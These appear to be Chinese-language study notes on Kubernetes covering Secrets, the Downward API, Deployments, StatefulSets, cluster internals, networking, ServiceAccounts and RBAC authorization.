卷中文件的更新并不是逐个文件进行的，Kubernetes 实际是先将卷的所有文件都复制到容器中的一个新文件夹，然后再更改链接指向这个新建的文件夹；这样就可以避免仅更新部分文件，还没有完成所有文件更新的情况下，容器中的应用程序已经开始加载文件了； 这意味着挂载的更新是以文件夹为单位的，因此，如果挂载的是单个文件，而该文件不会被更新； 虽然对于单个 pod 内部的容器，文件的更新是一次性完整的，但是对于不同 pod 引用相同的 configMap 的情况，这些 pod 之间并不是同步的，它们的更新有先有后； 仅在容器中的应用可以监控并主动重新加载更新后的文件时，挂载可以动态变化配置文件的 ConfigMap 才比较有意义；因为不然即使 ConfigMap 中的文件变化了，应用程序也不需要跟着变化； 使用 Secret 给容器传递敏感数据介绍 SecretSecret 被设计用来存储敏感信息，它的用法跟 ConfigMap 类似，区别在于它在写入节点时，不会被物理存储，只是仅存储在内存中，这样当 pod 删除时，也不会在物理介质中留下痕迹； 默认令牌 Secret 介绍为了让 pod 从内部可以访问 Kubernetes API，每个 pod 初始化创建时，都会写入一个默认的 secret 资源，它包含用来访问 API 的三个条目，分别是 ca.cert, token, namespace 等； 创建 Secret 对比 ConfigMap 与 SecretConfigMap 中的条目以纯文件存储，但是 Secret 的条目会被以 base64 编码后存储；这样导致读取的时候，需要进行解码；不过正因为使用了 base64 编码，这意味着 secret 可以支持二进制格式的条目内容； Secret 的大小有上限，最多只能是 1MB； 对于非二进制的数据，如果不想使用默认的 base64 编码，则可以在 secret 的描述文件中使用 stringData 属性来存放；但是在的展示时候看不出来，它仍然会以 base64 编码的形式展示在 data 字段中； 当 secret 卷被挂载到容器中后，条目的值会预先解码，并以原本的形式写入对应的文件，这样容器的应用程序在访问该值时，无须再做进一步的转换； 在 pod 中使用 Secret 将敏感数据暴露为环境变量的做法其实是有安全隐患的： 有些应用程序在启动或报错时，会打印环境变量到日志中； 应用程序在创建子程序时，会复制当前进程的环境变量；子进程可以访问到这些敏感信息； 当访问私有镜像仓库时，需要访问凭证进行登录，此时可以将访问凭证存放在 secret 中，然后在相关字段引用该 secret 即可；不过此时对凭证的引用是写在 pod 的定义文件中的，如果凭证被很多 pod 共用，则这显然不是一个好的作法，另外有一个 ServiceAcount 可以用来实现复用； 8. 从应用访问 pod 元数据以及其他资源通过 Downward API 传递元数据对于可以提前预知的信息，那么可以通过 ConfigMap 写入容器的环境变量，以便容器进行访问；但是对于容器生成之后才知道的信息，例如 pod 名称、IP 等，则这个方法就行不通了；此时可以使用 Downward API，它通过创建 DownwardAPI 卷，将 pod 的元数据作为环境变量或文件注入或挂载到容器中； 了解可用的元数据 pod 的名称 pod 的 IP pod 所在的命名空间 pod 运行节点的名称 pod 运行所归属的服务账户的名称 每个容器请求的 CPU 和内存的使用量 每个容器可以使用的 CPU 和内存的限制 pod 的标签 pod 的注解 服务账户是指 pod 访问 API 服务器时用来进行身份验证的账户； 通过环境变量暴露元数据 通过 downwardAPI 卷来传递元数据 卷中包含的文件由 items 属性来定义； 元数据被存储到了文件中，这些文件的访问权限可以由 downwardAPI 卷的 defaultMode 属性来设置； 相对于环境变量的方式，使用卷的好处是当 pod 创建后，如果某些元数据出现变更，例如标签或注解，则卷中文件的数据会实时更新，而环境变量就做不到这一点了； 由于卷是 pod 级别的资源，因此相对环境变量，它还有另外一个好处是可以让同一个 pod 上的多个容器共享彼此的元数据值； 使用 downwardAPI 来获取元数据的好处是简单方便，缺点是它只能获取部分数据（例如仅限于单个 pod），并不能获取所有数据，如果想要获取更多数据，就需要使用 Kubernetes API 的方式； 与 Kubernetes API 服务器交互探究 Kubernetes REST API运行 kubectl 时，本质上是通过 HTTP 来调用 Kubernetes 的 REST API 接口 url；因此，沿用相同的思路，我们也可以从容器内部调用这些 API 来实现与 Kubernetes 服务器的交互； 以下两个命令的效果相同 kubectl get job my-job -o json curl http://localhost:8001/apis/batch/v1/namespaces/default/jobs/my-job 从 pod 内部与 API 服务器进行交互从 pod 内部与 API 服务器进行交互需要确认三件事情： 找到 Kubernetes 服务器的 IP 地址和端口； 对服务器进行验证，确保是与真正的服务器交互，而不是冒充者； 通过服务器对客户端的验证，确保客户商具备相应的操作权限； pod 创建过程中自动注入的 secret 含有用来和 Kubernetes 进行通信的证书；并且还含有令牌 token，用来实现已授权的操作；同时还有一个 namespace 文件包含当前 pod 所在的命名空间名称； 通过 ambassador 容器简化与 API 服务器的交互ambassador 容器和应用程序的容器运行在同一个 pod 中，它的作用类似于一个中间代理；应用程序通过 HTTP 发送请求给它，再由它使用 HTTPS 和 API 服务器交互；ambassador 容器本质上是在其中运行了 kubectl proxy，就这么简单； 同一个 pod 中的多个容器使用相同的本地回环地址，因此可以通过 localhost 来访问其他容器中暴露的服务端口； 使用客户端库与 API 服务器交互除了使用原始的 HTTPS 请求外，还可以使用第三方库来实现交互，不同的语言都有相应的实现，可以在应用程序代码中引入这些库，来实现与 API 服务器的交互； 另外 Kubernetes 还自带了一个 swagger API 框架可以用来生成客户端库和文档；同时还提供了 swagger UI 界面可用来查看和访问 API；但它默认没有开启，需要在启动时通过选项设置为开启，之后就可以通过浏览器进行访问了； 9. Deployment：声明式地升级应用更新运行在 pod 内的应用程序删除旧版本 pod，创建新版本 pod更新 ReplicationController 中的模板信息（例如镜像版本）后，RC 控制器将会发现当前没有 pod 与模板相匹配，因此它会把旧版本的 pod 删除掉，之后创建新版本的 pod； 这种升级的方式非常简单易懂，但是它的缺点是在删除和新建之间，会出现短暂的服务不可用状态； 先创建新 pod 再删除旧版本 pod由于 pod 一般使用 service 对外暴露服务，因此可以先等所有的新版本 pod 都创建好了后，再修改 service 的标签选择器，让其绑定到新的 pod 上面即可； 使用 ReplicationController 实现自动的滚动升级kubectl rolling-update 命令可以用来执行滚动升级的操作；它会创建一个新的 replicationController ，然后由它来创建新版本的 pod； kubectl 执行滚动升级的过程中，除了创建新 RC 外，它还会给旧的 RC 和旧的 pod 添加标签（不会改动旧标签，以免影响原来的服务稳定性），通过新增的标签来区分新旧 pod，然后通过逐渐递减旧 RC 的副本数和递增新 RC 的副本数，来实现滚动升级的过程； kubectl rolling-update 并不是一种理想的滚动升级方式，原因如下： 它在更新过程中会去修改旧的资源； 它通过 kubectl 客户端发起更新的请求，在这一过程中有可能出现网络异常和中断，将导致整个更新过程失败； 使用 Deployment 声明式的升级应用滚动升级过程不可避免涉及到了两个 replicaSet，一个用来管理旧 pod，一个负责新 pod；因此，通过在 relicaSet 之上引入新的 Deployment 资源，就可以实现两个 replicaSet 的协调工作，让开发人员将预期结果写在 deployment 的描述文件中，之后实现的复杂性被隐藏； 创建 deploymentdeployment 并不直接创建 pod，它仍然通过 replicaSet 来管理和创建 pod；一个 deployment 可以对应多个 replicaSet，它通过给这些 replicaSet 加上模板的哈希值进行区分，同时也可以确保相同的模板会创建出相同的 pod； 升级 deploymentdeployment 的升级是非常简单的，它非常类似于 pod 的扩容或缩容，只需要更改模板中的镜像 tag，Kubernetes 就会自动进行收敛，达成预期的状态； deployment 的升级支持多种策略，默认使用 rollingUpdate 滚动升级，此外还支持 recreate 的一次性升级（即删除所有旧的，再创建所有新的，服务会短暂中断）； deployment 比 kubectl rolling-update 更好的原因在于升级过程是由上kubernetes 的控制器来完成，而不是客户端，这样就可以避免可能出现的网络中断问题； deployment 升级成功后，并不会删除旧的 replicaSet，因为它可以用来实现快速回滚； 回滚 deployment在升级的过程中，如果发现错误，此时可以使用 kubectl rollout undo 命令来实现回滚； 由于 deployment 保留着每一次升级时旧版本的 replicaSet，因此它也可以实现回滚到指定版本的 replicaSet 控制滚动升级速率在更新策略中，有两个属性会影响升级速度 maxSurge：表示允许超出预期副本数的 pod 数量或比例； maxUnavailable：表示允许少于预期副本数的 pod 数量或比例； 暂停和恢复滚动升级 阻止出错版本的滚动升级deployment 有一个 minReadySeconds 属性，它表示 pod 需要就绪一定的时间后，才能继续余下的升级工作，这样的好处是在发现 pod 有错误时，能否阻止错误进一步蔓延扩大到所有的 pod；一般来说它需要配合就绪探针使用； kubectl apply 可以用来更新当前已经创建的资源；如果资源不存在，则它会创建； deployment 有一个 progressDeadlineSeconds 属性，可以用来设置升级的最长时间，如果超过了这个时间，则意味着升级失败，升级操作将会被自动取消； 10. StatefulSet：部署有状态的多副本应用创建有状态 pod使用 replicaSet 创建的多个 pod，它们可以很容易的实现同一个持久卷的共享，但是如果想让每个 pod 拥有自己的持久卷，则无法实现； 有一种解决办法是让每个 replicaSet 只创建一个 pod，多个 pod 将产生个多个的 replicaSet，这样就可以实现每个 pod 有自己的独立存储； 另外，为了实现让每个 pod 都可以访问其他 pod，还需要为每个 pod 创建单独的 service，避免因为 pod 被删除后，重新创建的 pod 使用新的 IP 和名称，导致无法访问； 了解 StatefulSet对比 StatefulSet 和 ReplicaSet由ReplicaSet 创建的 pod，其名称是随机的，每次新建的 pod 的标识都跟之前的不同；它适用于完全无状态的应用，每个应用之间都可以相互替换而不会有影响； 由 StatefulSet 创建的 pod 将拥有唯一的标识和状态，名称是有规律和固定的（按顺序索引编号）；如果某个 pod 挂掉了，StatefulSet 将再创建一个有相同标识的 pod； 提供稳定的网络标识每个 pod 的名称由 StatefulSet 的名称加上索引号来组成；如果某个 pod 挂了，新建的 pod 将仍然使用和之前一样的名称； 当 pod 有了固定的名称后，意味着可以创建基于该名称的服务，然后其他 pod 可以通过它来实现稳定的访问；这么做还可以顺带有一个效果，即通过检查服务的列表后，就可以发现有多少个 StatefulSet 的 pod； StatefulSet 在缩容的时候，假设需要删除多个 pod，它每次只会操作一个，以便确保被删除的 pod 的数据有机会复制保存起来；因此，如果有某个 pod 处于不健康的状态，则此时不允许进行缩容操作，因为它可能会导致数据出现丢失； 为每个有状态实例提供稳定的专属存储就像 StatefulSet 的 pod 与服务一一对应一样，如果需要为pod 提供持久存储，则在模板中同时写出持久卷声明，之后在创建 pod 之前，就会先创建出与 pod 一一对应的持久卷声明；而每个持久卷声明又将会与某个持久卷一一对应； 当 pod 被缩容删除后，它原先绑定的持久卷声明并不会被自动删除，而是会持续保留着，因为里面可能存储着有状态的数据；直到被手工删除为止； StatefulSet 的保障由于 StatefulSet 中的每个 pod 都有唯一标识和存储，因此这意味着 K8s 不应该创建出两个相同的 pod，或者会发生冲突； 使用 StatefulSet创建应用和容器镜像 通过StatefulSet 部署应用一般需要创建三个对象，包括：持久卷（用于存储数据）、Service（用来外部访问）、StatefulSet本身；以下以谷歌的 Kubernetes 集群做为示例。 第1步：先创建磁盘 第2步：创建三个持久卷 第3步：创建 Headless Service 好奇：为什么使用 headless service 可以让 pod 之间彼此发现，而普通的 service 就做不到这点了吗？答：因为普通的 service 会对接请求，然后将请求随机转发至某个 pod，这样会导致 pod 之间不能实现与特定 pod 的通讯，因为普通 service 的转发是随机的；而 headless service 不再直接对接请求，而是让请求直接对接 pod，因此，它可以实现 pod 之间的直接访问；不过，为此付出的代价是，headless service 虽然也叫 service，但实际上并不能仅通过 service 来访问 pod，而是需要 . 这样来访问； 第4步：创建 StatefulSet 由于 statefulset 的 pod 是有状态的，因此在启动 statefulset 时，它们并不是同时启动的，而是按顺序启动，以免引起竞态条件； 使用你的 pod删除 statefulset 中的某个 pod 后，它会被重新创建，但不一定是调度到原来的节点上，有可能会被安排到新的节点上，不过问题不大，因为这个新建的 pod 会使用旧的名称，并且关联原有的旧的持久卷（如有）； 虽然 statefulset 在创建过程中，需要有一个 headless service；但是在 pod 都创建完毕后，也可以额外定义一个 service 来指向这些 pod； 在 StatefulSet 中发现伙伴节点headless service 之所以可以让 pod 之间彼此发现和通信，其原理在于它使用了 DNS 域名系统中的 SRV 记录，它会将请求转发到提供特定服务的那台服务器上面； 问：什么是 SRV？答：DNS 系统中保存着很多域名解析的记录，当收到一个解析请求时，DNS 根据这些记录为请求找到相应的目标 IP 地址；DNS 保存的记录有很多种类型，它们分别适用于不同的解析场景，例如 A记录（指向一个 IPv4地址）、MX记录（指向电子邮件服务器的地址）、CNAME记录（用于将当前域名映射到另外一个域名），以及 SRV记录（指向提供特定服务的服务器的地址）等等；（怎么感觉它跟子域名很像？） 通过 DNS 实现伙伴间彼此发现不同语言的代码都有关于如何做 SRV DNS 查询的实现，只要调用相应的方法，以服务域名作为参数，即可以查询该域名项下的所有的 SRV 记录，从而获得了各个 pod 的访问地址，实现 pod 之间的彼此发现； 更新 Statefulset通过命令 kubectl edit statefulset 可以调用默认的编辑器打开某个资源相应的声明文件，在对其更改并进行保存后，就可以实现对资源的更新； 此处 statefulset 有一个行为和 deployment 不太一样，即当对镜像的版本进行更新后，并不会影响原来已经在运行的容器，只会影响后续新建的容器；如果想让镜像马上得到使用的话，需要搬运删除原来的副本，然后 statefulset 就会根据新的模板创建新的容器；这一点跟 ReplicaSet 一致； 尝试集群数据存储对于 Statefulset 里面的 pod 来说，每个 pod 有自己的独立存储，因此数据事实上是分散在不同的 pod 之间的；通过在应用中调取 SRV 记录，实现对其它的 pod 的访问，可以收集散落在各个 pod 中的数据，统一返回给客户端，这样可以解决数据分散存储的问题，实现访问上的统一； 这种方式的缺点是代码写起来很麻烦，或许可以通过封装一个公用的函数来实现； 了解 StatuefulSet 如何处理节点失效由于 statefulset 中的 pod 是唯一的，这意味着如果调度器在不能明确某个 pod 是否已经失效时，不能随意去创建新的 pod，不然将有可能跟原来的 pod 产生冲突； 模拟一个节点的网络断开断开的命令： sudo ifconfig eth0 down，这个命令运行后，将导致原本进行中的 SSH 连接断开； 当断开网络连接时，pod 实际上是有在运行的，只是不再与调度器通信；调度器在失去该 pod 的通信后，一开始会将它标记为 unknown 状态，并在超过一定的时间后（可配置），会将 pod 从集群中删除掉； 手动删除 pod通过情况下，当通过命令调用 API 服务器来执行某个动作时（例如删除 pod ），API 服务器只是先发了一个删除指令给 kubelet，实际上是由 kubelet 来执行删除动作；在 kubelet 删除成功后，它会发通知给 API 服务器； API 服务器在收到通知后，更新自己的状态记录； 如果不想等待 kubelet 的通知，则可以在删除指令中加上 –force 和 –grace-period 两个参数，直接强制更新状态（一般情况下，最好不要使用这种方法，因为它有可能导致冲突）； 11. 了解 Kubernetes 机理了解架构Kubernetes 组件的分布式特性总共有三种类型的组件，分别是主节点组件、工作节点组件，以及一些提供额外功能的附加组件；所有的组件之间都是通过 API 服务器进行通信； 工作节点上的组件是一个整体，它们需要被安排在同一个节点上才能协同工作，但是主节点上的组件则没有这个要求，它们可以是分布式部署在不同的节点上的，甚至还可以有多个实例（以此来保证高可用性）；不过多出的实例只是作为备用，在某个的时间点，有且只有一个组件在真正的工作； 除了 Kubelet 组件外，其他组件都是做为 pod 来运行的，只有 Kubelet 需要做为常规的系统应用直接部署在节点上，因为总是需要有一个人来完成自举的动作，将其他组件作为 pod 部署在节点上； Flannel pod 据说是用来为 pod 提供重叠网络，啥是重叠网络？ Kubernetes 如何使用 etcd 问：什么是 etcd？ 答：原来它是一个数据库应用，类似 redis，提供 key-value 形式的存储，支持分布式部署，以提供高可用性和更好的性能；它使用乐观并发控制（也叫乐观锁）功能，即为数据提供版本号，在客户端尝试对数据进行修改时，需要提供之前客户端读取的版本号，如果与当前数据库中保存的版本号一致，则允许修改；如果版本号不一致，则拒绝修改请求，并要求客户端重新读取一下最新的数据后，再根据情况重新提交修改请求；etcd 的键名支持斜杠，因此导致键名看起来很像目录名，感觉像是有层级存在一样；键的值是以 JSON 形式存储的； 让所有组件通过 API 服务器来对接 etcd 有两个好处： 只有 API 服务器本身实现了并发控制机制（乐观锁）即可，无须担心直接对接的场景下，有些组件没有遵循乐观锁机制； API 服务器可以增加一层权限控制，确保授权的客户端才能够对数据发起修改； 当存在多个 etcd 实例时，etcd 集群使用 RAFT 算法来保证节点之间数据的一致性；该算法要求集群过半数的节点参与，才能进入下一个状态；这样可以避免某几个实例失联后带来的影响；因此 etcd 的实例数据必须为单数，这样才有可能过半数，避免出现平局的情况； API 服务器做了什么API 服务器以 REST API 的形式，提供了对集群状态进行增删改查 CRUD 的接口； 当客户端（例如 kubectl）向 API 服务器发起请求后，API 服务器在收到请求后，会先根据事先配置好的插件，对请求进行预处理，包括：验证身份（认证类插件）、授权核实（授权类插件）、准入控制（准入类插件）； 请求只有通过了以上所有这些插件的处理后，API 服务器才会验证存储到 etcd 的对象，然后返回响应给客户端； API 服务器如何通知客户端资源变更API 服务器除了做前面提到的那些工作外，其他就没有做其他的；唯一的事项是当资源发生变更时，给之前监听的客户端发送通知；关于资源的创建和维护工作，实际上是由其他组件完成的（例如调度器和 kubelet）； 了解调度器表面上看调度器做的工作很简单，当它监听到 API 服务器关于新建资源的通知后，它就为该资源指定一个节点，然后通知 API 服务器修改资源的定义，加上节点信息；之后 API 服务器会将该信息做为新通知发出来，此时处于监听状态的 kubelet 就会受到通知，然后在其节点上新建相应的资源；建好之后，再发通知给 API 服务器更新资源的状态； 虽然调度器的工作看上去很简单，但其实最难的部分在于如何最高效的调度资源，以便充分利用硬件资源，提高效率；此便会涉及到设计一套高效的调度算法； 调度算法分为两个步骤，第一步是先找出所有可用的节点；第二步是对可用节点进行排序，选择优先级分数最高的节点； 查找节点的工作涉及一系列应满足条件的判断；选择最佳节点则因情况而异，即不同情况下，有不同的优先级标准，例如是高可用性优先，还是成本优先等； 集群中允许有多个调度器，其中有一个会被当作默认调度器；当 pod 没有指定由哪个调度器进行调度时，则由默认的调度器进行调度；不同的调度器可以有不同的调度算法，以实现不同的优先级目标； 了解控制器不管是 API 服务器，或者是调度器，它们都只负责定义状态，而控制器的工作就在于让集群的状态向定义的状态收敛；控制器有很多个，每种资源都有一种相应的控制器； 当监听到 API 服务器关于资源状态的通知后，控制器就会去做实际的资源管理动作（例如新建、修改和删除等，注意：此处仅仅是操作资源，而不是容器），调整资源的最终状态与定义的状态相符，然后将新的资源状态反馈给 API 服务器；之后 API 服务器发布通知，最后由 Kubelet 完成容器级别的操作； Kubelet 做了什么动作一：通知 API 服务器创建一个 Node 资源，以注册其所在的节点； 动作二：持续监听 API 服务器的通知，如果有新消息，就通知容器运行时（例如 Docker），对节点上的容器进行操作； 动作三：当容器启动后，持续监控容器的运行状态、资源消耗、触发事件等； 有意思的是，Kubelet 不但可以从 API 服务器接收消息来创建和管理 pod，也可以从本地的文件目录中导入 pod 定义，来创建和管理 pod，即它是可以脱离 API 服务器独立运行的； Kubernetes Service Proxy 的作用工作节点上除了运行 Kubelet 外，还会运行一个 kube-proxy，它用来确保客户端可以通过 Kubernetes API 连接到节点上的服务； kube-proxy 的名称中之所以带有 proxy 字样，是因为在早期的设计中，它确实扮演着 proxy 的功能，请求会被 iptables 转到它这里，并由它再转发给后端的 pod；但后来这个设计做了改进；kube-proxy 只负责更新 iptables 里面的规则就好，实际请求可以由 iptables 直接转发给 pod，不再经过 kube-proxy，这样可以很好的提高性能； 介绍 Kubernetes 插件除了核心组件外，还有一些插件用来提供额外的功能，例如 DNS 服务器、仪表板、Ingress 控制器等； DNS 插件可以为集群内的所有 pod 提供 DNS 服务，这样 pod 之间就可以使用服务名进行彼此的访问，而无须事先知道对方的 IP 地址是多少，甚至是无头服务的 pod 也可以； Ingress 控制器实现的功能和 DNS 插件差不多，只是实现方式不同，它通过运行一个 nginx 服务器来实现创建和维护规则；相同的部分在于二者都是通过订阅监控 API 服务器的通知来实现更新； 控制器如何协作了解涉及哪些组件当创建一个 deployment 资源时，将会涉及以下这些组件的相互协作 事件链 观察集群事件通过 kubectl get events –watch 命令可以动态的观察集群中发生的事件； 有意思的是，当主节点的组件或者工作节点的 kubelet 执行动作后，需要发送事件给 API 服务器时，它们是通过创建事件资源来实现的，而不是直接调用 API 服务器的接口发送相应的请求（有点意思，为什么要这么做呢？虽然增加了一层抽象后提高了健壮性，不过貌似动作成本也不小）； 了解运行中的 pod 是什么当 kubelet 创建一个 pod 时，它并不仅仅只运行资源定义文件中声明的容器，它还会在 pod 上面运行一个基础容器，它用来保存命名空间，实现一个 pod 上的所有容器共享同一个网络和 Linux 命名空间；这个基础容器的生命周期和 pod 绑定在一起，当 pod 增加运行其他容器时，会从这个基础容器中获得需要的命名空间数据； 跨 pod 网络网络应该是什么样的对于同一个 pod 内部的容器，它们之间实现相互访问是非常简单的，因为它们共享一个网络，因此使用本地网络 localhost 就可以实现相互访问了；但如果想要实现跨 pod 的容器之间的相互访问，就需要一套每个 pod 共用的网络机制，这样才能够让每个 pod 的 IP 地址在这个网络中保持唯一性，让其他 pod 可以使用 IP 地址就可以实现连接，而无需使用 NAT 进行网络地址的转换； Kubernetes 本身只要求通信需要使用非 NAT 网络，但并没有规定这样的一个网络在技术上如何实现，而是交由插件来处理，这意味着可以根据需要，使用不同的网络插件来达到相同的目的； 深入了解网络工作原理同节点 上的 pod 通信假设 pod 是一台虚拟机的话，那么运行 pod 所在的节点有点像是一台物理机；虚拟机内部的容器之间由于共享一个网络，相互通信是很容易的；而对于节点所在这台物理机上面的不同 pod，它们本质上只是基于 Linux 命名空间的虚拟化技术下的一个分组，而节点 host 本身也是一个分组（即另一个命名空间）；分组和分组之间，共享节点上的同一个网络，但是它们的物理网卡接口却只有一个；为了解决这个问题，引入了一个叫做 veth（virtual ethernet）的虚拟网卡，并创建一个 veth 对，其中一个放在虚拟机的命名空间中，一个在物理机的命名空间中，二者之间形成一个管道，可以相互传输数据；同时将物理机的 veth 连接到物理机的网络上，这样就间接可以实现不同分组之间的相互通信了； 不同节点上的 pod 通信对于不同节点之间的通信，由于涉及不同的网卡，开始需要引入交换机或者路由器，此时可以有多种实现方式，例如： underlay：即传统的网络基础结构，每个节点有一个自己的独立物理 IP 地址，因此所有其他节点都可以访问； overlay：在 underlay 的基础上，增加一层逻辑网络（虚拟的），这样就可以脱离 IP 地址的限制，拥有自己独立的 IP 地址空间； 三层路由：节点之间共用一台交换机或者路由器进行连接，由路由器实现转发；此方案比较适合中小型局域网中；如果需要应对复杂的场景，则使用 SDN （软件定义网络）的 overlay 更合适； 引入容器网络接口为了实现容器连接到网络，以便和其他容器互相通信，有一系列的工作需要做，因此 Kubernetes 采用 Container Network Interface 接口来标准化这项工作；CNI 有很多插件实现，包括：Calino、Flannel、Romana 和 WaveNet 等； 服务是如何实现的引入 kube-proxy每个节点上都会运行一个 kube-proxy，和 Service 相关的所有事情，实际上都是由 kube-proxy 进行处理的；虽然 service 对外提供了一个稳定的 IP 地址和端口号，但其实它们都是虚拟的，并不能真正的 ping 通； kube-proxy 在早期版本的时候，确实有发挥代理的作用，对请求进行转发；但现在新的版本中，请求的转发工作是由 iptables 来处理的，kube-proxy 只需负责维护 iptables 的工作了； kube-proxy 如何使用 iptables当创建了一个 service 资源时，API 服务器会给所有的节点发通知，kube-proxy 在收到通知后，就会更新自己负责的 iptables 规则，在上面建立一个映射，将服务的 IP 地址和端口映射到能够真正提供服务的 pod 的 IP 地址和端口；之后如果 iptables 发挥有数据包的目标地址是 service 的地址，它就会按映射表将其替换为实际的 pod 地址，将数据包重定向到 提供服务的 pod； 除了要监控 API 服务器关于 service 变更的通知外，kube-proxy 还需要监控 API 服务器关于 Endpoint 变更的通知；因为 Endpoint 对象中保存着关于提供某个 service 服务的 pod 信息（IP 地址和端口号）； 运行高可用集群使用 Kubernetes 来部署应用的最核心目的，就是减少运维的工作，让应用能够以最简单的方式可靠的运行，因此 Kubernetes 还需要提供一系列的组件来监控各类资源的状态，确保它们在发生故障后，能够被及时处理； 让应用变得高可用方案一：运行多个实例来减少宕机的可能性该方案需要应用本身支持水平扩展；如果不支持，仍然可以使用 Deployment，只需将副本数设置为 1；这样当实例发生故障时，Deployment 会创建一个新的 pod 实例来替换它；当然，由于创建 pod 的过程需要一点时间，因此不可避免会出现一小段的宕机时间； 方案二：对无法实现水平扩展的应用使用领导选举机制 提前创建多个实例，但在某个时刻就有一个在工作，其中实例处于备用状态；当工作中的实例发生故障时，就在备用的实例中选举一个实例成为工作实例； 实例的选举工作可以在不改变原应用代码的情况下实现，即通过创建一个 sidecar 容器来完成领导选举的工作，点击这里查看更多实现代码 让 Kubernetes 主节点变得高可用实现办法：增加多个主节点的实例 etcd 本身就已经是多实例的分布式设计，多个实例之间会自动同步； API 服务器是无状态的，本身不存储任何数据，因此多少个都没有问题； 管理器和调度器需要实施领导推选机制，某个时候有且只一个处于工作的状态，其他实例作为备用；（它的推举机制特别简单，类似乐观锁的机制，当某个实例能够将自己的名字写入指定对象的属性中时，谁就成为领导，剩下的成为备用；领导者默认每2秒钟需要做一次更新资源的动作；其他实例则监控领导者是否定时更新，如果它们发现领导者超过时间没有更新，大家就重新开始竞争将自己的名字写入指定对象的属性； 12. Kubernetes API 服务器的安全防护了解认证机制当请求到达 API 服务器后，API 服务器需要验证该请求是否合法，因此将首先由认证类的插件提取请求中的用户身份，当获得用户的身份信息后，API 服务器就会停止调用剩下的其他插件，直接进入授权插件处理的阶段；常用的认证插件包括： 客户端证书 HTTP 头部中的认证 token 基础的 HTTP 认证 用户和组API 服务器允许被两种类型的用户访问： 一种是机器用户，例如 pod 或者运行在 pod 中的应用； 一种是真人用户，例如开发人员或者运维人员通过 kubectl 客户端发起的请求； 每个用户都属于一个或者多个组，而每个组背后将关联不同的权限；认证插件在认证用户身份后，会返回该用户所属的组名； ServiceAccount 介绍pod 与 API 服务器进行通信时，使用 ServiceAccount 机制来证明自己的身份，它会在请求中附带发送 token；token 的内容是在创建容器时，提前挂载到容器中的某个文件里面； ServiceAccount 本身也是一个资源，跟 pod、secret、configMap 等资源的性质是一样的，因此它们只会作用于某个单独的命名空间，而不是全局有效的； 在一个命名空间中，可以有多个 ServiceAccount 资源；一个 ServiceAccount 资源可以被多个 pod 关联；但一个 pod 不能关联多个 ServiceAccount； 在 pod 的声明文件中，如果不显式的指定 pod 所关联的 ServiceAccount，则 pod 将被关联到其所在的命名空间中的默认的 ServiceAccount；当然，也可以显式的指定要关联的其他 ServiceAccount 名称； 当 pod 关联 ServiceAccount 后，它所能访问的资源，将由 ServiceAccount 来决定了； 创建 ServiceAccount默认的 ServiceAccount 的权限还是很大的，如果让所有的 pod 都使用默认的 ServiceAccount，显然这种做法并不够安全；每个 pod 所能操作的资源应当在不影响其正常工作的范围内，尽可能的小； 通过 kubectl create serviceaccount 命令就可以快速创建一个 ServiceAccount，但是在创建 ServiceAccount 之前，需要创建一个 token（用 Secret 资源来实现），因为创建 ServiceAccount 时，需要引用一个已经提前创建好的 token； 理论上 pod 允许挂载任何的 secret 到其容器中，但是这样有风险，会导致某些 secret 被暴露了；此时可以通过在 ServiceAccount 指定 pod 允许挂载的 secret 列表，来限制 pod 的挂载范围； ServiceAccount 还有一个设置镜像拉取密钥的属性，这个属性不是用来限制可挂载的密钥范围的，而是用来实现挂载镜像拉取密钥的自动化；所有关联该 ServiceAccount 的 pod，都会自动被挂载该镜像拉取密钥，从而能够从私有仓库拉取需要的镜像； 将 ServiceAccount 分配给 pod在 pod 的定义文件中的 spec.serviceAccountName 字段，即可以用来显式的指定 pod 所要关联的 ServiceAccount；该字段的值在 pod 创建后就不能修改了，需要在创建时提前设置好； ServiceAccount 本身并不包含任何的权限功能（除了控制可挂载密钥的范围外），因此如果没有特别的进行设置的话，所有新创建 ServiceAccount 都默认具有全部的资源操作权限；因此它需要配合 RBAC 授权插件一起使用，才能起到控制权限的效果； 通过基于角色的权限控制加强集群安全在早期的 Kubernetes 版本中，由于安全控制做得不够完善，只要在某个 pod 中查找到其所用的 token，就可以实现和 API 服务器的通信，对集群中的资源做任何想做的操作；在 1.8 版本之后，RBAC 插件升级为全局可用并默认开启，它会阻止未授权的用户查看和修改集群的状态； 介绍 RBAC 授权插件背景：API 服务器对外暴露的是 REST 接口，因此用户是通过发送 HTTP 请求调用相应的接口来实现某个操作的；请求由动作+资源名称来组成；基于该背景，RBAC 的控制机制就是检查该请求的动作和资源是否都属于允许操作的范围； RBAC 是基于用户所属的角色来检查用户的授权情况的；一个用户可能对应多个角色，只要某个角色拥有某种资源的某个操作权限，则请求就会得到通过； 介绍 RBAC 资源RBAC 授权规则通过四种资源来实现配置；这四种资源可分为两个组： 角色组：Role、ClusterRole，它们指定了在资源上面可以执行哪些动词；二者的差别在于前者面向命名空间内的资源，后者面向集群级别的资源； 角色绑定组：RoleBinding、ClusterRoleBinding，它们将上述角色绑定到特定的用户、组或者 ServiceAccount 上面； 角色组决定了用户可以做哪些操作，角色绑定组决定了谁可以做这些操作； 虽然 RoleBinding 在命名空间下起作用，不能跨命名空间，但是这并不影响它们引用集群级别的角色，因此集群角色并不属于任何的命名空间； 在启用了 RBAC 插件后，pod 默认绑定的 serviceAccount 并不具备查询或修改集群资源的权限，这样可以最大程度的保证集群的安全性； 使用 Role 和 RoleBinding定义 role 资源的示例 每个资源都属于某个 API 资源组，在声明文件中定义资源的时候，字段 apiVersion 即是指定资源所属的 API 资源组； 复数的资源名称表示可以访问所有的同类型资源，但是也可以通过增加资源名称进一步缩小访问范围； Role 是归属于命名空间的资源，因为不同的命名空间可以拥有相同的 Role 名称，但里面的内容可能不同 在 Kubernetes 中需要通过创建 RoleBinding 资源来实现角色与相关主体（如用户、ServiceAccount、组等）的绑定（这个理念很有意思，有点面向对象的意思，即想要实现的动作，通过创建对象来实现）； 在 GKE 中创建角色之前，需要让当前的客户端账号获取集群管理员的角色，即需要为当前账号创建一个 clusterRoleBinding 资源，来进行集群管理员角色的绑定，示例如下： RoleBinding 只能将单个角色绑定到一个或多个主体上，这些主体可以归属于不同的命名空间；但是不能反过来，即将多个角色绑定到一个或多个主体上； 问：这貌似意味着如果主体需要绑定多个角色，要创建多个 RoleBinding 资源？ 使用 ClusterRole 和 ClusterRoleBinding普通的角色只能访问到自己所处命名空间中的资源；ClusterRole 则可以访问集群级别的资源，或者所有命名空间中的资源（这样可以避免在多个命名空间中定义相同的角色，只需定义一个 ClusterRole 的角色，就可以多次使用了，即被不同命名空间中的 RoleBinding 